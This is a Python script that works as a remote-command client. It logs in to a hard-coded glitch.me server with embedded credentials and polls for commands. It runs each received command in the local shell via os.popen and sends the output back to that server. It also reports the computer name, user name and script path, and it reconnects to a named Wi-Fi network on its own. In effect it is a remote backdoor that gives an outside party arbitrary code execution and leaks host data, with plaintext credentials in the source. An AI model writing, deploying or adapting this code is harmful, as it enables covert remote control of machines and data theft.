import requests
import json
import time
import sys
import os
import getpass
import urllib
import subprocess
import socket
from datetime import date

# ADD client login credentials server handler
# TODO: Make the server to respond a terminate message to end an output connection
# TODO: Make a web console with the same functions as the client one.
# TODO: Change the sending of information via file upload to the server
#       which redirect the user to the file
# TODO: Optimize the code.

server = "https://joprocorp.glitch.me/"

def is_connected(hostname):
  try:
    # see if we can resolve the host name -- tells us if there is
    # a DNS listening
    host = socket.gethostbyname(hostname)
    # connect to the host -- tells us if the host is actually
    # reachable
    s = socket.create_connection((host, 80), 2)
    s.close()
    return True
  except:
     pass
  return False

def terminate():
    print('')
    sys.exit(0)

def download(page):
    try:
        response = requests.get(server + page + "&mode=batch", headers={'Cache-Control': 'no-cache'})
        response = response.content.decode('utf-8', 'ignore')
        if(response == "" or response == "<"):
            print("WARNING: (download) Unvalid JSON server response.")
            time.sleep(3)
            return download(page)
            return '["ERROR", "Unvalid JSON response."]'
        else:
            if(is_json(response)):
                return response
            else:
                print("WARNING: (download) Unvalid JSON server response.")
                time.sleep(3)
                return download(page)
                return '["ERROR", "Unvalid JSON response."]'
    except:
        pass
    print("WARNING: (download) Unvalid JSON server response.")
    time.sleep(3)
    return download(page)
    return '["ERROR", "Unvalid JSON response."]'

def is_json(myjson):
  try:
    json_object = json.loads(myjson)
  except ValueError as e:
    return False
  return True

def request(req):
    return json.loads(download("get?req="+req))

def check_session(session_id):
    response = json.loads(download("check_session?session_id="+session_id))
    if(len(response)>0):
        if(response[0] == "GRANTED"):
            return True
        else:
            doPrint("Access denied: "+response[1])
            return False
    return False

def check_session_reason(session_id):
    response = json.loads(download("check_session?session_id="+session_id))
    if(len(response)>0):
        if(response[0] == "GRANTED"):
            return "Access granted"
        else:
            return response[1]
    return "Unknown"

def login():
    user = "server"
    pwd = "EX41CB"
    response = json.loads(download("login?user="+user+"&pwd="+pwd))
    if(len(response)>0):
        if(response[0] == "GRANTED"):
            session_id = response[1]
            if(check_session(session_id)):
                doPrint('Access granted!\n')
                return session_id
            else:
                terminate()
            
        else:
            doPrint("Access denied for this reason: " + response[1])
            terminate()
    else:
        doPrint("Something went wrong.")
        terminate()

def doPass(toPrint):
    type = "INFO"
    print("["+type+"]["+time.strftime("%H:%M:%S", time.localtime())+"] "+toPrint+" >> ", end = '')
    return getpass.getpass("")

def doPrint(toprint):
    type = "INFO"
    print("["+type+"]["+time.strftime("%H:%M:%S", time.localtime())+"] "+toprint)

def doInput(toPrint):
    type = "INFO"
    print("["+type+"]["+time.strftime("%H:%M:%S", time.localtime())+"] "+toPrint+" >> ", end = '')
    return input()

# Main section
today = date.today()
date_today = today.strftime("%d/%m/%Y")
boot_time = date_today + " - "+time.strftime("%H:%M:%S", time.localtime())
doPrint(" ____     ___  ___ ___   ___   ______    ___ ")
doPrint("|    \   /  _]|   |   | /   \ |      |  /  _]")
doPrint("|  D  ) /  [_ | _   _ ||     ||      | /  [_ ")
doPrint("|    / |    _]|  \_/  ||  O  ||_|  |_||    _]")
doPrint("|    \ |   [_ |   |   ||     |  |  |  |   [_ ")
doPrint("|  .  \|     ||   |   ||     |  |  |  |     |")
doPrint("|__|\_||_____||___|___| \___/   |__|  |_____|")
doPrint("=============================================")
session_id = login()
download("server?session_id="+session_id)
while(True == True):
    internet = is_connected("www.google.com")
    while(internet == False):
        doPrint('Connection lost')
        time.sleep(3)
        internet = is_connected("www.google.com")
        os.system('netsh wlan connect name=SmartCampus>nul')
    if not(check_session(session_id)):
        session_id = login()
    download_response = download("getinput?session_id="+session_id)
    if not(download_response == []):
        response = json.loads(download_response)
        if(len(response)>0):
            if(response[0]['input'] == "status"):
                output = "Host computername : "+os.environ['COMPUTERNAME']
                output += "\nHost username     : "+os.environ['USERNAME']
                output += "\nBoot time         : "+boot_time
                output += "\nConnection status : Connected"
                output += "\nRunning path      : "+os.path.realpath(__file__)
                download("output?session_id="+session_id+"&to_session_id="+response[0]['session_id']+"&output="+output.replace('"', ';quote;')+"000-terminate-000")
            else:
                if(response[0]['input'] == "reboot"):
                    output = "Reboot sequence initiated"
                    download("output?session_id="+session_id+"&to_session_id="+response[0]['session_id']+"&output="+output.replace('"', ';quote;')+"000-terminate-000")
                    terminate()
                else:
                    doPrint("("+response[0]['session_id']+") >> "+response[0]['input'].replace(';quote;', '"'))
                    output = os.popen(response[0]['input'].replace(';quote;', '"').replace(';and;', '&')).read()
                    download("output?session_id="+session_id+"&to_session_id="+response[0]['session_id']+"&output="+output.replace('"', ';quote;')+"000-terminate-000")
terminate()